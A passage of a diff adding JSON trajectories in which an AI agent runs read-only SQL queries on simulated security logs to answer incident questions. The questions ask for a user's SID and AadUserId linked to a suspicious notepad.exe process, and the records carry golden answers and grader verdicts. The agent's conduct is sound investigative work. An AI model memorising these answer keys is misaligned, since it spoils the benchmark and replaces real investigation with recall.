'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LogonId', 'text', 'YES', '', None, ''), ('MD5', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('ProcessCommandLine', 'text', 'YES', '', None, ''), ('ProcessCreationTime', 'text', 'YES', '', None, ''), ('ProcessId', 'text', 'YES', '', None, ''), ('ProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('ProcessTokenElevation', 'text', 'YES', '', None, ''), ('ProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('ProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('InitiatingProcessSignerType', 'text', 'YES', '', None, ''), ('InitiatingProcessSignatureStatus', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('SHA1', 'text', 'YES', '', None, ''), ('SHA256', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountSid FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a' AND AccountName = 'nathans' AND FileName = 'powershell.exe' LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountSid, DeviceName, AccountName, FileName FROM DeviceProcessEvents WHERE DeviceName LIKE '%vnevado%' AND AccountName = 'nathans' AND FileName LIKE '%powershell%' LIMIT 5",
+                "observation": "[('S-1-5-21-1240151660-3534038288-105586567-4122', 'vnevado-win11a.vnevado.alpineskihouse.co', 'nathans', 'powershell.exe'), ('S-1-5-21-1240151660-3534038288-105586567-4122', 'vnevado-win11a.vnevado.alpineskihouse.co', 'nathans', 'powershell.exe'), ('S-1-5-21-1240151660-3534038288-105586567-4122', 'vnevado-win11a.vnevado.alpineskihouse.co', 'nathans', 'powershell.exe'), ('S-1-5-21-1240151660-3534038288-105586567-4122', 'vnevado-win11a.vnevado.alpineskihouse.co', 'nathans', 'powershell.exe'), ('S-1-5-21-1240151660-3534038288-105586567-4122', 'vnevado-win11a.vnevado.alpineskihouse.co', 'nathans', 'powershell.exe')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "S-1-5-21-1240151660-3534038288-105586567-4122",
+                "observation": "",
+                "reward": 1,
+                "done": true,
+                "info": {
+                    "check_ans_response": "Analysis: The submitted answer matches the golden answer exactly, providing the correct SID associated with the user account involved in the suspicious activity.  \nIs_Answer_Correct: True",
+                    "reward": 1,
+                    "check_ans_reflection": "Reflection: The previous evaluation correctly identifies that the submitted answer matches the golden answer exactly and provides the correct SID without any additional or conflicting information.\n\nAnalysis: The submitted answer precisely corresponds to the golden answer (`S-1-5-21-1240151660-3534038288-105586567-4122`). It accurately identifies the SID associated with the user account involved in the suspicious activity, as requested.\n\nIs_Answer_Correct: True",
+                    "submitted_answer": "S-1-5-21-1240151660-3534038288-105586567-4122",
+                    "query_success": true,
+                    "submit": true
+                }
+            }
+        ]
+    },
+    {
+        "success": true,
+        "steps": 25,
+        "reward": 1,
+        "success_query_count": 23,
+        "total_query_count": 24,
+        "question": {
+            "context": "An unexpected behavior was observed by a process `notepad.exe` executed with no command line arguments on host `vnevado-win11a`. This behavior is unusual for a legitimate `notepad.exe` process and could be a result of code injection or a malicious executable masquerading as `notepad.exe`. The process `notepad.exe` was launched with Process ID `8932` and involved IP addresses `72.5.72.208` and `202.183.149.174`. The associated account name was `nathans` with Sid `S-1-5-21-1240151660-3534038288-105586567-4122` and AadDeviceId `39d8c57f-2d08-4888-b0cd-12cd0679337a`.",
+            "question": "Can you identify the AadUserId associated with this incident?",
+            "answer": "12185914-91dd-4fb9-94f9-3252203b0426",
+            "solution": [
+                "Unexpected behavior observed by a process ran with no command line arguments might indicate extraneous code injection or a malicious executable masquerading as the legitimate one. This activity was observed for the user with AadUserId `12185914-91dd-4fb9-94f9-3252203b0426`."
+            ],
+            "start_alert": 15,
+            "end_alert": 15,
+            "start_entities": [
+                4,
+                8,
+                2,
+                16,
+                11,
+                1,
+                9,
+                12
+            ],
+            "end_entities": [
+                3
+            ],
+            "shortest_alert_path": [
+                15
+            ]
+        },
+        "trajectory": [
+            {
+                "action": "DESCRIBE process_creation",
+                "observation": "ProgrammingError: Table 'env_monitor_db.process_creation' doesn't exist",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": false,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SHOW TABLES",
+                "observation": "[('AADManagedIdentitySignInLogs',), ('AADNonInteractiveUserSignInLogs',), ('AADServicePrincipalSignInLogs',), ('AZFWApplicationRule',), ('AZFWApplicationRuleAggregation',), ('AZFWDnsQuery',), ('AZFWIdpsSignature',), ('AZFWNetworkRule',), ('AZFWNetworkRuleAggregation',), ('AlertEvidence',), ('AlertInfo',), ('AuditLogs',), ('AzureMetrics',), ('CloudAppEvents',), ('DeviceEvents',), ('DeviceFileCertificateInfo',), ('DeviceFileEvents',), ('DeviceImageLoadEvents',), ('DeviceInfo',), ('DeviceLogonEvents',), ('DeviceNetworkEvents',), ('DeviceNetworkInfo',), ('DeviceProcessEvents',), ('DeviceRegistryEvents',), ('EmailAttachmentInfo',), ('EmailEvents',), ('EmailUrlInfo',), ('Heartbeat',), ('IdentityDirectoryEvents',), ('IdentityLogonEvents',), ('IdentityQueryEvents',), ('MicrosoftAzureBastionAuditLogs',), ('MicrosoftGraphActivityLogs',), ('SecurityAlert',), ('SecurityIncident',), ('SigninLogs',), ('ThreatIntelligenceIndicator',), ('Usage',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceProcessEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountObjectId', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('AccountUpn', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('FileName', 'text', 'YES', '', None, ''), ('FolderPath', 'text', 'YES', '', None, ''), ('FileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessLogonId', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LogonId', 'text', 'YES', '', None, ''), ('MD5', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('ProcessCommandLine', 'text', 'YES', '', None, ''), ('ProcessCreationTime', 'text', 'YES', '', None, ''), ('ProcessId', 'text', 'YES', '', None, ''), ('ProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('ProcessTokenElevation', 'text', 'YES', '', None, ''), ('ProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('ProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('ProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('InitiatingProcessSignerType', 'text', 'YES', '', None, ''), ('InitiatingProcessSignatureStatus', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('SHA1', 'text', 'YES', '', None, ''), ('SHA256', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceInfo",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('ClientVersion', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('DeviceObjectId', 'text', 'YES', '', None, ''), ('IsAzureADJoined', 'text', 'YES', '', None, ''), ('LoggedOnUsers', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('OSArchitecture', 'text', 'YES', '', None, ''), ('OSBuild', 'text', 'YES', '', None, ''), ('OSPlatform', 'text', 'YES', '', None, ''), ('OSVersion', 'text', 'YES', '', None, ''), ('PublicIP', 'text', 'YES', '', None, ''), ('RegistryDeviceTag', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('AadDeviceId', 'text', 'YES', '', None, ''), ('DeviceCategory', 'text', 'YES', '', None, ''), ('DeviceSubtype', 'text', 'YES', '', None, ''), ('DeviceType', 'text', 'YES', '', None, ''), ('JoinType', 'text', 'YES', '', None, ''), ('MergedDeviceIds', 'text', 'YES', '', None, ''), ('MergedToDeviceId', 'text', 'YES', '', None, ''), ('Model', 'text', 'YES', '', None, ''), ('OnboardingStatus', 'text', 'YES', '', None, ''), ('OSDistribution', 'text', 'YES', '', None, ''), ('OSVersionInfo', 'text', 'YES', '', None, ''), ('Vendor', 'text', 'YES', '', None, ''), ('SensorHealthState', 'text', 'YES', '', None, ''), ('IsExcluded', 'text', 'YES', '', None, ''), ('ExclusionReason', 'text', 'YES', '', None, ''), ('AssetValue', 'text', 'YES', '', None, ''), ('ExposureLevel', 'text', 'YES', '', None, ''), ('IsInternetFacing', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountObjectId FROM DeviceProcessEvents WHERE DeviceName = 'vnevado-win11a' AND ProcessId = '8932' AND AccountName = 'nathans' AND AccountSid = 'S-1-5-21-1240151660-3534038288-105586567-4122'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT DeviceId FROM DeviceInfo WHERE AadDeviceId = '39d8c57f-2d08-4888-b0cd-12cd0679337a'",
+                "observation": "[('ea4d0f6828d838027701d6a85a2408c9317ad687',), ('ea4d0f6828d838027701d6a85a2408c9317ad687',), ('ea4d0f6828d838027701d6a85a2408c9317ad687',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountObjectId FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND ProcessId = '8932' AND AccountName = 'nathans' AND AccountSid = 'S-1-5-21-1240151660-3534038288-105586567-4122'",
+                "observation": "[('',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE SigninLogs",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('ResourceId', 'text', 'YES', '', None, ''), ('OperationName', 'text', 'YES', '', None, ''), ('OperationVersion', 'text', 'YES', '', None, ''), ('Category', 'text', 'YES', '', None, ''), ('ResultType', 'text', 'YES', '', None, ''), ('ResultSignature', 'text', 'YES', '', None, ''), ('ResultDescription', 'text', 'YES', '', None, ''), ('DurationMs', 'text', 'YES', '', None, ''), ('CorrelationId', 'text', 'YES', '', None, ''), ('Resource', 'text', 'YES', '', None, ''), ('ResourceGroup', 'text', 'YES', '', None, ''), ('ResourceProvider', 'text', 'YES', '', None, ''), ('Identity', 'text', 'YES', '', None, ''), ('Level', 'text', 'YES', '', None, ''), ('Location', 'text', 'YES', '', None, ''), ('AlternateSignInName', 'text', 'YES', '', None, ''), ('AppDisplayName', 'text', 'YES', '', None, ''), ('AppId', 'text', 'YES', '', None, ''), ('AuthenticationContextClassReferences', 'text', 'YES', '', None, ''), ('AuthenticationDetails', 'text', 'YES', '', None, ''), ('AppliedEventListeners', 'text', 'YES', '', None, ''), ('AuthenticationMethodsUsed', 'text', 'YES', '', None, ''), ('AuthenticationProcessingDetails', 'text', 'YES', '', None, ''), ('AuthenticationRequirement', 'text', 'YES', '', None, ''), ('AuthenticationRequirementPolicies', 'text', 'YES', '', None, ''), ('ClientAppUsed', 'text', 'YES', '', None, ''), ('ConditionalAccessPolicies', 'text', 'YES', '', None, ''), ('ConditionalAccessStatus', 'text', 'YES', '', None, ''), ('CreatedDateTime', 'text', 'YES', '', None, ''), ('DeviceDetail', 'text', 'YES', '', None, ''), ('IsInteractive', 'text', 'YES', '', None, ''), ('Id', 'text', 'YES', '', None, ''), ('IPAddress', 'text', 'YES', '', None, ''), ('IsRisky', 'text', 'YES', '', None, ''), ('LocationDetails', 'text', 'YES', '', None, ''), ('MfaDetail', 'text', 'YES', '', None, ''), ('NetworkLocationDetails', 'text', 'YES', '', None, ''), ('OriginalRequestId', 'text', 'YES', '', None, ''), ('ProcessingTimeInMilliseconds', 'text', 'YES', '', None, ''), ('RiskDetail', 'text', 'YES', '', None, ''), ('RiskEventTypes', 'text', 'YES', '', None, ''), ('RiskEventTypes_V2', 'text', 'YES', '', None, ''), ('RiskLevelAggregated', 'text', 'YES', '', None, ''), ('RiskLevelDuringSignIn', 'text', 'YES', '', None, ''), ('RiskState', 'text', 'YES', '', None, ''), ('ResourceDisplayName', 'text', 'YES', '', None, ''), ('ResourceIdentity', 'text', 'YES', '', None, ''), ('ResourceServicePrincipalId', 'text', 'YES', '', None, ''), ('ServicePrincipalId', 'text', 'YES', '', None, ''), ('ServicePrincipalName', 'text', 'YES', '', None, ''), ('Status', 'text', 'YES', '', None, ''), ('TokenIssuerName', 'text', 'YES', '', None, ''), ('TokenIssuerType', 'text', 'YES', '', None, ''), ('UserAgent', 'text', 'YES', '', None, ''), ('UserDisplayName', 'text', 'YES', '', None, ''), ('UserId', 'text', 'YES', '', None, ''), ('UserPrincipalName', 'text', 'YES', '', None, ''), ('AADTenantId', 'text', 'YES', '', None, ''), ('UserType', 'text', 'YES', '', None, ''), ('FlaggedForReview', 'text', 'YES', '', None, ''), ('IPAddressFromResourceProvider', 'text', 'YES', '', None, ''), ('SignInIdentifier', 'text', 'YES', '', None, ''), ('SignInIdentifierType', 'text', 'YES', '', None, ''), ('ResourceTenantId', 'text', 'YES', '', None, ''), ('HomeTenantId', 'text', 'YES', '', None, ''), ('UniqueTokenIdentifier', 'text', 'YES', '', None, ''), ('SessionLifetimePolicies', 'text', 'YES', '', None, ''), ('AutonomousSystemNumber', 'text', 'YES', '', None, ''), ('AuthenticationProtocol', 'text', 'YES', '', None, ''), ('CrossTenantAccessType', 'text', 'YES', '', None, ''), ('AppliedConditionalAccessPolicies', 'text', 'YES', '', None, ''), ('RiskLevel', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE DeviceDetail LIKE '%39d8c57f-2d08-4888-b0cd-12cd0679337a%' AND UserPrincipalName LIKE 'nathans%'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE (IPAddress = '72.5.72.208' OR IPAddress = '202.183.149.174') AND UserPrincipalName LIKE 'nathans%'",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE DeviceNetworkEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('AppGuardContainerId', 'text', 'YES', '', None, ''), ('DeviceId', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountDomain', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountName', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountObjectId', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountSid', 'text', 'YES', '', None, ''), ('InitiatingProcessAccountUpn', 'text', 'YES', '', None, ''), ('InitiatingProcessCommandLine', 'text', 'YES', '', None, ''), ('InitiatingProcessFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessFolderPath', 'text', 'YES', '', None, ''), ('InitiatingProcessId', 'text', 'YES', '', None, ''), ('InitiatingProcessIntegrityLevel', 'text', 'YES', '', None, ''), ('InitiatingProcessMD5', 'text', 'YES', '', None, ''), ('InitiatingProcessParentFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessParentId', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA1', 'text', 'YES', '', None, ''), ('InitiatingProcessSHA256', 'text', 'YES', '', None, ''), ('InitiatingProcessTokenElevation', 'text', 'YES', '', None, ''), ('InitiatingProcessFileSize', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoCompanyName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoProductVersion', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoInternalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoOriginalFileName', 'text', 'YES', '', None, ''), ('InitiatingProcessVersionInfoFileDescription', 'text', 'YES', '', None, ''), ('LocalIP', 'text', 'YES', '', None, ''), ('LocalIPType', 'text', 'YES', '', None, ''), ('LocalPort', 'text', 'YES', '', None, ''), ('MachineGroup', 'text', 'YES', '', None, ''), ('Protocol', 'text', 'YES', '', None, ''), ('RemoteIP', 'text', 'YES', '', None, ''), ('RemoteIPType', 'text', 'YES', '', None, ''), ('RemotePort', 'text', 'YES', '', None, ''), ('RemoteUrl', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('InitiatingProcessParentCreationTime', 'text', 'YES', '', None, ''), ('InitiatingProcessCreationTime', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT InitiatingProcessAccountObjectId FROM DeviceNetworkEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND (RemoteIP = '72.5.72.208' OR RemoteIP = '202.183.149.174') AND InitiatingProcessId = '8932'",
+                "observation": "[('',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE DeviceDetail LIKE '%39d8c57f-2d08-4888-b0cd-12cd0679337a%' AND UserId IS NOT NULL LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT TimeGenerated FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND ProcessId = '8932' AND AccountName = 'nathans'",
+                "observation": "[('2024-06-26 15:49:51.304638+00:00',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE DeviceDetail LIKE '%39d8c57f-2d08-4888-b0cd-12cd0679337a%' AND TimeGenerated BETWEEN '2024-06-26 15:40:00' AND '2024-06-26 15:55:00' LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT LoggedOnUsers FROM DeviceInfo WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687'",
+                "observation": "[('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',), ('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',), ('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',), ('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',), ('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',), ('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',), ('[{\"UserName\":\"nathans\",\"DomainName\":\"VNEVADO\",\"Sid\":\"S-1-5-21-1240151660-3534038288-105586567-4122\"}]',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "DESCRIBE IdentityLogonEvents",
+                "observation": "[('TenantId', 'text', 'YES', '', None, ''), ('TimeGenerated', 'text', 'YES', '', None, ''), ('Timestamp', 'text', 'YES', '', None, ''), ('ActionType', 'text', 'YES', '', None, ''), ('Application', 'text', 'YES', '', None, ''), ('LogonType', 'text', 'YES', '', None, ''), ('Protocol', 'text', 'YES', '', None, ''), ('FailureReason', 'text', 'YES', '', None, ''), ('AccountName', 'text', 'YES', '', None, ''), ('AccountDomain', 'text', 'YES', '', None, ''), ('AccountUpn', 'text', 'YES', '', None, ''), ('AccountSid', 'text', 'YES', '', None, ''), ('AccountObjectId', 'text', 'YES', '', None, ''), ('AccountDisplayName', 'text', 'YES', '', None, ''), ('DeviceName', 'text', 'YES', '', None, ''), ('DeviceType', 'text', 'YES', '', None, ''), ('OSPlatform', 'text', 'YES', '', None, ''), ('IPAddress', 'text', 'YES', '', None, ''), ('Port', 'text', 'YES', '', None, ''), ('DestinationDeviceName', 'text', 'YES', '', None, ''), ('DestinationIPAddress', 'text', 'YES', '', None, ''), ('DestinationPort', 'text', 'YES', '', None, ''), ('TargetDeviceName', 'text', 'YES', '', None, ''), ('TargetAccountDisplayName', 'text', 'YES', '', None, ''), ('Location', 'text', 'YES', '', None, ''), ('ISP', 'text', 'YES', '', None, ''), ('ReportId', 'text', 'YES', '', None, ''), ('AdditionalFields', 'text', 'YES', '', None, ''), ('SourceSystem', 'text', 'YES', '', None, ''), ('Type', 'text', 'YES', '', None, '')]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountObjectId FROM IdentityLogonEvents WHERE DeviceName = 'vnevado-win11a' AND AccountName = 'nathans' AND AccountSid = 'S-1-5-21-1240151660-3534038288-105586567-4122' AND TimeGenerated BETWEEN '2024-06-26 15:40:00' AND '2024-06-26 15:55:00' LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE DeviceDetail LIKE '%\\\"deviceId\\\":\\\"39d8c57f-2d08-4888-b0cd-12cd0679337a\\\"%' LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountUpn FROM DeviceProcessEvents WHERE DeviceId = 'ea4d0f6828d838027701d6a85a2408c9317ad687' AND ProcessId = '8932' AND AccountName = 'nathans'",
+                "observation": "[('nathans@vnevado.alpineskihouse.co',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE UserPrincipalName = 'nathans@vnevado.alpineskihouse.co' LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT UserId FROM SigninLogs WHERE DeviceDetail LIKE '%39d8c57f-2d08-4888-b0cd-12cd0679337a%' LIMIT 1",
+                "observation": "[]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountObjectId FROM DeviceProcessEvents WHERE AccountUpn = 'nathans@vnevado.alpineskihouse.co' LIMIT 1",
+                "observation": "[('',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "SELECT AccountObjectId FROM IdentityLogonEvents WHERE AccountUpn = 'nathans@vnevado.alpineskihouse.co' LIMIT 1",
+                "observation": "[('12185914-91dd-4fb9-94f9-3252203b0426',)]",
+                "reward": 0,
+                "done": false,
+                "info": {
+                    "query_success": true,
+                    "submit": false
+                }
+            },
+            {
+                "action": "12185914-91dd-4fb9-94f9-3252203b0426",
+                "observation": "",
+                "reward": 1,
+                "done": true,
+                "info": {
+                    "check_ans_response": "Analysis: The submitted answer is identical to the golden answer, which correctly identifies the AadUserId associated with this incident.  \nIs_Answer_Correct: True",
+                    "reward": 1,
+                    "check_ans_reflection": "Reflection: The previous evaluation correctly identifies that the submitted answer matches the golden answer perfectly, addressing the question and providing the correct AadUserId associated with the incident.\n\nAnalysis: The submitted answer is identical to the golden answer, accurately providing the AadUserId `12185914-91dd-4fb9-94f9-3252203b0426` as requested by the question. There are no discrepancies or additional irrelevant details.\n\nIs_Answer_Correct: True",
+                    "submitted_answer": "12185914-91dd-4fb9-94f9-3252203b0426",
+                    "query_success": true,
+                    "submit": true
+                }
+            }
+        ]
+    }
+]
